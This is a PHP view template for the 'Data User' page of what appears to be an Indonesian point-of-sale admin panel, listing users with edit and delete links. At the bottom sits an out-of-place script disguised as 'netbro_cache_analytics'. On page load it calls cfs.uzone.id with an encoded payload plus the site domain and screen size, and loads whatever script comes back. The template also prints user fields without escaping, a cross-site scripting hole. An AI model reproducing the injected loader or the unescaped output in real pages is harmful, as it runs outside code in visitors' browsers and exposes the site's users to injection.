<!DOCTYPE html>
<!--[if IE 8]>
<html lang="en" class="ie8"> <![endif]-->
<!--[if IE 9]>
<html lang="en" class="ie9"> <![endif]-->
<!--[if !IE]><!-->
<html lang="en"> <!--<![endif]-->
                 <!-- BEGIN HEAD -->
<head>
    <meta charset="utf-8"/>
    <title>POS</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <meta content="" name="description"/>
    <meta content="" name="author"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_default.css" rel="stylesheet" id="style_color"/>

    <link href="<?php echo site_url(); ?>assets/assets/fancybox/source/jquery.fancybox.css" rel="stylesheet"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url() ?>assets/assets/uniform/css/uniform.default.css"/>
</head>
                 <!-- END HEAD -->
                 <!-- BEGIN BODY -->
<body class="fixed-top">
<!-- BEGIN HEADER -->
<?php $this->load->view('header.php') ?>
<!-- END HEADER -->
<!-- BEGIN CONTAINER -->
<div id="container" class="row-fluid">
    <!-- BEGIN SIDEBAR -->
    <div id="sidebar" class="nav-collapse collapse">
        <div class="sidebar-toggler hidden-phone"></div>
        <!-- BEGIN RESPONSIVE QUICK SEARCH FORM -->
        <div class="navbar-inverse">
            <form class="navbar-search visible-phone">
                <input type="text" class="search-query" placeholder="Search"/>
            </form>
        </div>
        <!-- END RESPONSIVE QUICK SEARCH FORM -->
        <!-- BEGIN SIDEBAR MENU -->
        <?php $this->load->view('sidebar.php') ?>
        <!-- END SIDEBAR MENU -->
    </div>
    <!-- END SIDEBAR -->
    <!-- BEGIN PAGE -->
    <div id="main-content">
        <!-- BEGIN PAGE CONTAINER-->
        <div class="container-fluid">
            <!-- BEGIN PAGE HEADER-->
            <div class="row-fluid">
                <div class="span12">
                    <!-- BEGIN THEME CUSTOMIZER-->
                    <!-- END THEME CUSTOMIZER-->
                    <!-- BEGIN PAGE TITLE & BREADCRUMB-->
                    <h3 class="page-title">
                        Data User
                    </h3>
                    <ul class="breadcrumb">
                        <li>
                            <a href="#">
                                <i class="icon-home"></i>
                            </a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Data User</a>
                            <span class="divider-last">&nbsp;</span>
                        </li>
                    </ul>
                    <!-- END PAGE TITLE & BREADCRUMB-->
                </div>
            </div>
            <!-- END PAGE HEADER-->
            <!-- BEGIN PAGE CONTENT-->
            <div class="row-fluid">
                <div class="span12">
                    <!-- BEGIN SAMPLE TABLE widget-->
                    <div class="widget">
                        <div class="widget-title">
                            <h4>
                                <i class="icon-reorder"></i>
                                User
                            </h4>
                        </div>
                        <div class="widget-body">
                            <div class="portlet-body">
                                <div class="clearfix">
                                    <div class="btn-group">
                                        <a href="<?php echo site_url('admin/user/tambah'); ?>">
                                            <button type="button" class="btn green">
                                                Tambah User
                                                <i class="icon-plus"></i>
                                            </button>
                                        </a>
                                    </div>
                                </div>

                                <div class="space15"></div>
                                <table class="table table-striped table-hover table-bordered" id="sample_editable_1">
                                    <thead>
                                    <tr>
                                        <th>No</th>
                                        <th>Nama</th>
                                        <th>Level</th>
                                        <th>Username</th>
                                        <th>Outlet</th>
                                        <th>No. Telepon</th>
                                        <th>Edit</th>
                                        <th>Hapus</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <?php
                                    $jumlah = 0;
                                    foreach ($pengguna as $data)
                                    {
                                        ?>
                                        <tr>
                                            <td><?php echo $jumlah += 1 ?></td>
                                            <td><?php echo $data->nama ?></td>
                                            <td><?php echo $data->level ?></td>
                                            <td><?php echo $data->username ?></td>
                                            <td><?php echo $data->nama_outlet ?></td>
                                            <td><?php echo $data->telepon ?></td>
                                            <td>
                                                <a href="<?php echo base_url('admin/user/edit/' . $data->id_user); ?>" class="edit"> Edit</a>
                                            </td>
                                            <td>
                                                <a href="<?php echo base_url('admin/user/hapus/' . $data->id_user); ?>" class="delete"> Hapus</a>
                                            </td>
                                        </tr>
                                    <?php } ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <!-- END SAMPLE TABLE widget-->
                </div>

            </div>

            <!-- END PAGE CONTENT-->
        </div>
        <!-- END PAGE CONTAINER-->
    </div>
    <!-- END PAGE -->
</div>
<!-- END CONTAINER -->
<!-- BEGIN FOOTER -->
<?php $this->load->view('footer.php') ?>
<!-- END FOOTER -->
<!-- BEGIN JAVASCRIPTS -->
<!-- Load javascripts at bottom, this will reduce page load time -->
<script src="<?php echo site_url(); ?>assets/js/jquery-1.8.3.min.js"></script>
<script src="<?php echo site_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
<script src="<?php echo site_url(); ?>assets/js/jquery.blockui.js"></script>
<!-- ie8 fixes -->
<!--[if lt IE 9]>
<script src="js/excanvas.js"></script>
<script src="js/respond.js"></script>
<![endif]-->
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/uniform/jquery.uniform.min.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/data-tables/jquery.dataTables.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/data-tables/DT_bootstrap.js"></script>
<script src="<?php echo site_url(); ?>assets/js/scripts.js"></script>
<script>
    jQuery(document).ready(function () {
        // initiate layout and plugins
        App.init();
    });
</script>
<script type="text/javascript">if (self == top)
    {
        function netbro_cache_analytics(fn, callback)
        {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn)
        {
            fn();
        }

        function requestCfs()
        {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r   = Math.floor(Math.random() * 99999999999);
            var url         = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCoiZb4e8fPgGSrzxny7Bs3aod8JI8r9WL9Zcv7DcypTafjTWjc8KR2rkdE9obmG7qlrJ2O5wLAkWR1EJqX2Vw3XHzhSxfTrKeWUMN%2fPcq0BczrMMWqL2II2LVGvo%2fLRG4DhbjGKEsZdcZL4LU4xZawooHEtryQ0qQNeuH5SQxs1tw3yuYvo5OhvukPSA2cDtmyw0tv5%2bRdXMSlocozQyrPDu1qVuLzjutFTJOoQp8dVo%2btM5%2fmonVTIoyxvO%2fR5ym5xzf8cPUDTRBHlfMTcYMP4CweKyBABoQqAv1HRqCiZjg4cJ20X8CMROLUtQAzEbRS01S6BNqFaZDZvhyKg%2by7qRaxsxelD3CKygl%2by6sAjqArSopYZHVtGQZ3q3RRyXJgSVAbtqpFYozwVREhvfgyg3ZXJpLVl2s1jwQDNi2JnJxTNIfd4vOts2xHvqzYjtf%2fOTi9HSZtTUp73nxmdrLtyx5DfG%2fk90GdQpnnOHtIpzO4Ia5UIm0TZfeS11TfQY0I%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa         = document.createElement('script');
            bsa.type        = 'text/javascript';
            bsa.async       = true;
            bsa.src         = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
</script>
</body>
                 <!-- END BODY -->
</html>
